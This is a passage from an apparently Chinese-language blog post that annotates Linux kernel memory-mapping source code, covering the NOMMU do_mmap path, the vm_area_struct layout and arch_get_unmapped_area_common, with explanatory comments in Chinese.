class="keyword">struct</span> <span class="title">vm_region</span> *<span class="title">region</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> *<span class="title">rb</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> capabilities, result;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	*populate = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* decide whether we should attempt the mapping, and if so what sort of</span></span><br><span class="line"><span class="comment">	 * mapping */</span></span><br><span class="line">	ret = validate_mmap_request(file, addr, len, prot, flags, pgoff,</span><br><span class="line">				    &amp;capabilities); <span class="comment">/* 用于决定是否应该尝试映射 */</span></span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* we ignore the address hint */</span></span><br><span class="line">	addr = <span class="number">0</span>;</span><br><span class="line">	len = PAGE_ALIGN(len);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* we&#x27;ve determined that we can make the mapping, now translate what we</span></span><br><span class="line"><span class="comment">	 * now know into VMA flags */</span></span><br><span class="line">	vm_flags |= determine_vm_flags(file, prot, flags, capabilities); </span><br><span class="line"></span><br><span class="line">	<span class="comment">/* we&#x27;re going to need to record the mapping */</span></span><br><span class="line">	region = kmem_cache_zalloc(vm_region_jar, GFP_KERNEL); <span class="comment">/* 记录映射(kmem_cache_zalloc除了分配内存对象之外,还把内存对象所代表的内存空间初始化为&quot;0&quot;) */</span></span><br><span class="line">	<span class="keyword">if</span> (!region)</span><br><span class="line">		<span class="keyword">goto</span> error_getting_region;</span><br><span class="line"></span><br><span class="line">	vma = vm_area_alloc(current-&gt;mm); <span class="comment">/* 调用kmem_cache_alloc分配新的vma,然后调用vma_init进行初始化 */</span></span><br><span class="line">	<span class="keyword">if</span> (!vma)</span><br><span class="line">		<span class="keyword">goto</span> error_getting_vma;</span><br><span class="line"></span><br><span class="line">	region-&gt;vm_usage = <span class="number">1</span>; <span class="comment">/* 设置vm_region */</span></span><br><span class="line">	region-&gt;vm_flags = vm_flags;</span><br><span class="line">	region-&gt;vm_pgoff = pgoff;</span><br><span class="line">	</span><br><span class="line">	vma-&gt;vm_flags = vm_flags; <span class="comment">/* 设置vm_area_struct */</span></span><br><span class="line">	vma-&gt;vm_pgoff = pgoff;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (file) &#123; <span class="comment">/* 这里的file就是通过mmap的参数&#x27;fd&#x27;得来的 */</span></span><br><span class="line">		region-&gt;vm_file = get_file(file);</span><br><span class="line">		vma-&gt;vm_file = get_file(file);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	down_write(&amp;nommu_region_sem);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* if we want to share, we need to check for regions created by other</span></span><br><span class="line"><span class="comment">	 * mmap() calls that overlap with our proposed mapping</span></span><br><span class="line"><span class="comment">	 * - we can only share with a superset match on most regular files</span></span><br><span class="line"><span class="comment">	 * - shared mappings on character devices and memory backed files are</span></span><br><span class="line"><span class="comment">	 *   permitted to overlap inexactly as far as we are concerned for in</span></span><br><span class="line"><span class="comment">	 *   these cases, sharing is handled in the driver or filesystem rather</span></span><br><span class="line"><span class="comment">	 *   than here</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (vm_flags &amp; VM_MAYSHARE) &#123; <span class="comment">/* VM_MAYSHARE:用于确定是否可以设置对应的VM_SHARED(可以被多个进程共享) */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">vm_region</span> *<span class="title">pregion</span>;</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> pglen, rpglen, pgend, rpgend, start;</span><br><span class="line"></span><br><span class="line">		pglen = (len + PAGE_SIZE - <span class="number">1</span>) &gt;&gt; PAGE_SHIFT;</span><br><span class="line">		pgend = pgoff + pglen;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (rb = rb_first(&amp;nommu_region_tree); rb; rb = rb_next(rb)) &#123;</span><br><span class="line">			pregion = rb_entry(rb, struct vm_region, vm_rb);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!(pregion-&gt;vm_flags &amp; VM_MAYSHARE))</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* search for overlapping mappings on the same file */</span></span><br><span class="line">			<span class="keyword">if</span> (file_inode(pregion-&gt;vm_file) !=</span><br><span class="line">			    file_inode(file)) </span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (pregion-&gt;vm_pgoff &gt;= pgend)</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">			rpglen = pregion-&gt;vm_end - pregion-&gt;vm_start;</span><br><span class="line">			rpglen = (rpglen + PAGE_SIZE - <span class="number">1</span>) &gt;&gt; PAGE_SHIFT;</span><br><span class="line">			rpgend = pregion-&gt;vm_pgoff + rpglen;</span><br><span class="line">			<span class="keyword">if</span> (pgoff &gt;= rpgend)</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* handle inexactly overlapping matches between</span></span><br><span class="line"><span class="comment">			 * mappings */</span></span><br><span class="line">			<span class="keyword">if</span> ((pregion-&gt;vm_pgoff != pgoff || rpglen != pglen) &amp;&amp;</span><br><span class="line">			    !(pgoff &gt;= pregion-&gt;vm_pgoff &amp;&amp; pgend &lt;= rpgend)) &#123;</span><br><span class="line">				<span class="comment">/* new mapping is not a subset of the region */</span></span><br><span class="line">				<span class="keyword">if</span> (!(capabilities &amp; NOMMU_MAP_DIRECT))</span><br><span class="line">					<span class="keyword">goto</span> sharing_violation;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* we&#x27;ve found a region we can share */</span></span><br><span class="line">			pregion-&gt;vm_usage++;</span><br><span class="line">			vma-&gt;vm_region = pregion; <span class="comment">/* 设置vm_area_struct */</span></span><br><span class="line">			start = pregion-&gt;vm_start;</span><br><span class="line">			start += (pgoff - pregion-&gt;vm_pgoff) &lt;&lt; PAGE_SHIFT;</span><br><span class="line">			vma-&gt;vm_start = start;</span><br><span class="line">			vma-&gt;vm_end = start + len;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (pregion-&gt;vm_flags &amp; VM_MAPPED_COPY)</span><br><span class="line">				vma-&gt;vm_flags |= VM_MAPPED_COPY;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				ret = do_mmap_shared_file(vma); <span class="comment">/* 在文件上设置共享映射(驱动程序或文件系统提供并固定存储) */</span></span><br><span class="line">				<span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">					vma-&gt;vm_region = <span class="literal">NULL</span>;</span><br><span class="line">					vma-&gt;vm_start = <span class="number">0</span>;</span><br><span class="line">					vma-&gt;vm_end = <span class="number">0</span>;</span><br><span class="line">					pregion-&gt;vm_usage--;</span><br><span class="line">					pregion = <span class="literal">NULL</span>;</span><br><span class="line">					<span class="keyword">goto</span> error_just_free;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			fput(region-&gt;vm_file);</span><br><span class="line">			kmem_cache_free(vm_region_jar, region);</span><br><span class="line">			region = pregion;</span><br><span class="line">			result = start;</span><br><span class="line">			<span class="keyword">goto</span> share;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* obtain the address at which to make a shared mapping</span></span><br><span class="line"><span class="comment">		 * - this is the hook for quasi-memory character devices to</span></span><br><span class="line"><span class="comment">		 *   tell us the location of a shared mapping</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (capabilities &amp; NOMMU_MAP_DIRECT) &#123;</span><br><span class="line">			addr = file-&gt;f_op-&gt;get_unmapped_area(file, addr, len,</span><br><span class="line">							     pgoff, flags); </span><br><span class="line">            <span class="comment">/* get_unmapped_area调用的是&quot;current-&gt;mm-&gt;get_unmapped_area&quot;,在不同体系结构上对应不同的函数,但这些函数的基本原理都是类似的 */</span></span><br><span class="line">			<span class="keyword">if</span> (IS_ERR_VALUE(addr)) &#123;</span><br><span class="line">				ret = addr;</span><br><span class="line">				<span class="keyword">if</span> (ret != -ENOSYS)</span><br><span class="line">					<span class="keyword">goto</span> error_just_free;</span><br><span class="line"></span><br><span class="line">				<span class="comment">/* the driver refused to tell us where to site</span></span><br><span class="line"><span class="comment">				 * the mapping so we&#x27;ll have to attempt to copy</span></span><br><span class="line"><span class="comment">				 * it */</span></span><br><span class="line">				ret = -ENODEV;</span><br><span class="line">				<span class="keyword">if</span> (!(capabilities &amp; NOMMU_MAP_COPY))</span><br><span class="line">					<span class="keyword">goto</span> error_just_free;</span><br><span class="line"></span><br><span class="line">				capabilities &amp;= ~NOMMU_MAP_DIRECT;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				vma-&gt;vm_start = region-&gt;vm_start = addr;</span><br><span class="line">				vma-&gt;vm_end = region-&gt;vm_end = addr + len;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	vma-&gt;vm_region = region;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* set up the mapping</span></span><br><span class="line"><span class="comment">	 * - the region is filled in if NOMMU_MAP_DIRECT is still set</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (file &amp;&amp; vma-&gt;vm_flags &amp; VM_SHARED) <span class="comment">/* VM_SHARED:可以被多个进程共享 */</span></span><br><span class="line">		ret = do_mmap_shared_file(vma); <span class="comment">/* 在文件上设置共享映射(驱动程序或文件系统提供并固定存储) */</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		ret = do_mmap_private(vma, region, len, capabilities); <span class="comment">/* 设置私有映射或匿名共享映射 */</span></span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error_just_free;</span><br><span class="line">	add_nommu_region(region);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* clear anonymous mappings that don&#x27;t ask for uninitialized data */</span></span><br><span class="line">	<span class="keyword">if</span> (!vma-&gt;vm_file &amp;&amp; !(flags &amp; MAP_UNINITIALIZED)) <span class="comment">/* 清除不要求未初始化数据的匿名映射 */</span></span><br><span class="line">		<span class="built_in">memset</span>((<span class="keyword">void</span> *)region-&gt;vm_start, <span class="number">0</span>,</span><br><span class="line">		       region-&gt;vm_end - region-&gt;vm_start);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* okay... we have a mapping; now we have to register it */</span></span><br><span class="line">	result = vma-&gt;vm_start;</span><br><span class="line"></span><br><span class="line">	current-&gt;mm-&gt;total_vm += len &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">share:</span><br><span class="line">	add_vma_to_mm(current-&gt;mm, vma); <span class="comment">/* 在list和tree的适当位置将VMA添加到进程的mm_struct中,如果不是匿名页面,也添加到地址空间的页面树中 */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* we flush the region from the icache only when the first executable</span></span><br><span class="line"><span class="comment">	 * mapping of it is made  */</span></span><br><span class="line">	<span class="keyword">if</span> (vma-&gt;vm_flags &amp; VM_EXEC &amp;&amp; !region-&gt;vm_icache_flushed) &#123;</span><br><span class="line">		flush_icache_range(region-&gt;vm_start, region-&gt;vm_end);</span><br><span class="line">		region-&gt;vm_icache_flushed = <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	up_write(&amp;nommu_region_sem);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">error_just_free:</span><br><span class="line">	up_write(&amp;nommu_region_sem);</span><br><span class="line">error:</span><br><span class="line">	<span class="keyword">if</span> (region-&gt;vm_file)</span><br><span class="line">		fput(region-&gt;vm_file);</span><br><span class="line">	kmem_cache_free(vm_region_jar, region);</span><br><span class="line">	<span class="keyword">if</span> (vma-&gt;vm_file)</span><br><span class="line">		fput(vma-&gt;vm_file);</span><br><span class="line">	vm_area_free(vma);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">sharing_violation:</span><br><span class="line">	up_write(&amp;nommu_region_sem);</span><br><span class="line">	pr_warn(<span class="string">&quot;Attempt to share mismatched mappings\n&quot;</span>);</span><br><span class="line">	ret = -EINVAL;</span><br><span class="line">	<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">error_getting_vma:</span><br><span class="line">	kmem_cache_free(vm_region_jar, region);</span><br><span class="line">	pr_warn(<span class="string">&quot;Allocation of vma for %lu byte allocation from process %d failed\n&quot;</span>,</span><br><span class="line">			len, current-&gt;pid);</span><br><span class="line">	show_free_areas(<span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">error_getting_region:</span><br><span class="line">	pr_warn(<span class="string">&quot;Allocation of vm region for %lu byte allocation from process %d failed\n&quot;</span>,</span><br><span class="line">			len, current-&gt;pid);</span><br><span class="line">	show_free_areas(<span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>首先调用 <code>vm_area_alloc</code>（底层还是调用 <code>kmem_cache_alloc</code>，然后调用 <code>vma_init</code> 把该 <code>vma</code> 插入红黑树）</li>
<li>新分配的 <code>vm_area_struct</code> 用于管理进程使用的虚拟地址（虚存管理的最基本的管理单元）：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> &#123;</span></span><br><span class="line">	<span class="comment">/* The first cache line has the info for VMA tree walking. */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vm_start;		<span class="comment">/* Our start address within vm_mm. */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vm_end;		<span class="comment">/* The first byte after our end address</span></span><br><span class="line"><span class="comment">					   within vm_mm. */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* linked list of VM areas per task, sorted by address */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vm_next</span>, *<span class="title">vm_prev</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">vm_rb</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Largest free memory gap in bytes to the left of this VMA.</span></span><br><span class="line"><span class="comment">	 * Either between this VMA and vma-&gt;vm_prev, or between one of the</span></span><br><span class="line"><span class="comment">	 * VMAs below us in the VMA rbtree and its -&gt;vm_prev. This helps</span></span><br><span class="line"><span class="comment">	 * get_unmapped_area find a free area of the right size.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> rb_subtree_gap;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Second cache line starts here. */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">vm_mm</span>;</span>	<span class="comment">/* The address space we belong to. */</span></span><br><span class="line">	<span class="keyword">pgprot_t</span> vm_page_prot;		<span class="comment">/* Access permissions of this VMA. */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vm_flags;		<span class="comment">/* Flags, see mm.h. */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * For areas with an address space and backing store,</span></span><br><span class="line"><span class="comment">	 * linkage into the address_space-&gt;i_mmap interval tree.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">rb</span>;</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> rb_subtree_last;</span><br><span class="line">	&#125; shared;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * A file&#x27;s MAP_PRIVATE vma can be in both i_mmap tree and anon_vma</span></span><br><span class="line"><span class="comment">	 * list, after a COW of one of the file pages.	A MAP_SHARED vma</span></span><br><span class="line"><span class="comment">	 * can only be in the i_mmap tree.  An anonymous MAP_PRIVATE, stack</span></span><br><span class="line"><span class="comment">	 * or brk vma (with NULL file) can only be in an anon_vma list.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">anon_vma_chain</span>;</span> <span class="comment">/* Serialized by mmap_sem &amp;</span></span><br><span class="line"><span class="comment">					  * page_table_lock */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">anon_vma</span> *<span class="title">anon_vma</span>;</span>	<span class="comment">/* Serialized by page_table_lock */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Function pointers to deal with this struct. */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Information about our backing store: */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> vm_pgoff;		<span class="comment">/* Offset (within vm_file) in PAGE_SIZE</span></span><br><span class="line"><span class="comment">					   units */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">vm_file</span>;</span>		<span class="comment">/* File we map to (can be NULL). */</span></span><br><span class="line">	<span class="keyword">void</span> * vm_private_data;		<span class="comment">/* was vm_pte (shared mem) */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">atomic_long_t</span> swap_readahead_info;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_region</span> *<span class="title">vm_region</span>;</span>	<span class="comment">/* NOMMU mapping region */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mempolicy</span> *<span class="title">vm_policy</span>;</span>	<span class="comment">/* NUMA policy for the VMA */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_userfaultfd_ctx</span> <span class="title">vm_userfaultfd_ctx</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">core_thread</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">core_thread</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">core_state</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span> nr_threads;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">core_thread</span> <span class="title">dumper</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">completion</span> <span class="title">startup</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>核心函数 <code>get_unmapped_area</code> 调用的是 <code>current-&gt;mm-&gt;get_unmapped_area</code>，在 Linux 中，实际上调用的是 <code>arch_get_unmapped_area</code>（进程中能够找到查找空闲虚拟内存的方法）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">mmap_allocation_direction</span> &#123;</span>UP, DOWN&#125;; <span class="comment">/* UP == &#x27;0&#x27;, DOWN == &#x27;1&#x27; */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">arch_get_unmapped_area</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr0,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">unsigned</span> <span class="keyword">long</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">long</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> arch_get_unmapped_area_common(filp,</span><br><span class="line">			addr0, len, pgoff, flags, UP); <span class="comment">/* addr0 == &#x27;0&#x27; */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">arch_get_unmapped_area_common</span><span class="params">(struct file *filp,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">unsigned</span> <span class="keyword">long</span> addr0, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">unsigned</span> <span class="keyword">long</span> pgoff,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags, <span class="keyword">enum</span> mmap_allocation_direction dir)</span> <span class="comment">/* dir == UP */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> addr = addr0;</span><br><span class="line">	<span class="keyword">int</span> do_color_align;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_unmapped_area_info</span> <span class="title">info</span>;</span> <span class="comment">/* 用于管理分配内存请求 */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(len &gt; TASK_SIZE))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; MAP_FIXED) &#123;</span><br><span class="line">		<span class="comment">/* Even MAP_FIXED mappings must reside within TASK_SIZE */</span></span><br><span class="line">		<span class="keyword">if</span> (TASK_SIZE - len &lt; addr)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * We do not accept a shared mapping if it would violate</span></span><br><span class="line"><span class="comment">		 * cache aliasing constraints.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> ((flags &amp; MAP_SHARED) &amp;&amp;</span><br><span class="line">		    ((addr - (pgoff &lt;&lt; PAGE_SHIFT)) &amp; shm_align_mask))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">return</span> addr;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	do_color_align = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (filp || (flags &amp; MAP_SHARED))</span><br><span class="line">		do_color_align = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* requesting a specific address */</span></span><br><span class="line">	<span class="keyword">if</span> (addr) &#123;</span><br><span class="line">		<span class="keyword">if</span> (do_color_align)</span><br><span class="line">			addr = COLOUR_ALIGN(addr, pgoff);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			addr = PAGE_ALIGN(addr);</span><br><span class="line"></span><br><span class="line">		vma = find_vma(mm, addr); <span class="comment">/* 找到对应的vma */</span></span><br><span class="line">		<span class="keyword">if</span> (TASK_SIZE - len &gt;= addr &amp;&amp;</span><br><span class="line">		    (!vma || addr + len &lt;= vm_start_gap(vma)))</span><br><span class="line">			<span class="keyword">return</span> addr;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	info.length = len; </span><br><span class="line">	info.align_mask = do_color_align ? (PAGE_MASK &amp; shm_align_mask) : <span class="number">0</span>;</span><br><span class="line">	info.align_offset = pgoff &lt;&lt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (dir == DOWN) &#123; <span class="comment">/* 自上而下进行映射(在本调用链中恒不成立) */</span></span><br><span class="line">		info.flags = VM_UNMAPPED_AREA_TOPDOWN;</span><br><span class="line">		info.low_limit = PAGE_SIZE;</span><br><span class="line">		info.high_limit = mm-&gt;mmap_base;</span><br><span class="line">		addr = vm_unmapped_area(&amp;info); <span class="comment">/* 根据vm_unmapped_area_info扫描mmap映射区域来查找满足请求的内存 */</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!(addr &amp; ~PAGE_MASK)) <span class="comment">/* &quot;addr&amp;~PAGE_MASK&quot;可判定addr是否是4096倍数,如果结果为&quot;0&quot;,则是,否则不是 */</span></span><br><span class="line">			<span class="keyword">return</span> addr; <span class="comment">/* addr是否是4096倍数则返回 */</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * A failed mmap() very likely causes application failure,</span></span><br><span class="line"><span class="comment">		 * so fall back to the bottom-up function here. This scenario</span></span><br><span class="line"><span class="comment">		 * can happen with large stack limits and large mmap()</span></span><br><span class="line"><span class="comment">		 * allocations.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">	&#125;</span><br><span 